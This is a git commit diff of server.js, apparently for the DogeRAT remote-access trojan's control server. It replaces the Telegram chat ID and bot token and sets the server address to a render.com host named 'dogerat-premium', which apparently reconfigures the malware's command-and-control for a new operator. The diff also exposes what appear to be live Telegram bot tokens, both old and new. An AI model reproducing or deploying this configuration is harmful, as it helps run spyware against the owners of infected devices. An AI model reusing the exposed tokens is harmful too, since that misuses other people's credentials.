17a0d5c1cabb2755e7e90c5ff2ddbf1344c64116
AK TECH <90190809+adwaithkm@users.noreply.github.com>
2025-01-29 04:28:10 +0530

    Update server.js

--- server.js
+++ server.js
@@ -5,9 +5,9 @@ const app = express()
 app.use(bodyParser.json());
 const server = http.createServer(app);
 const wss = new socket.Server({server});
-const chatId = '5265371934'
-const token = '5171666407:AAFbQ6iLPo2r9DazrMN9sPhtYdWLy_uxGf8'
-const serverAddr = ''
+const chatId = '7533436358'
+const token = '7580543030:AAG_LlkLKtT11q36xDz8wLbf7yOjhkZgl20'
+const serverAddr = 'https://dogerat-premium-6rrw.onrender.com'
 const bot = new TelegramBot(token, {polling: true});
 
 // request -------------------------------------------------------------------
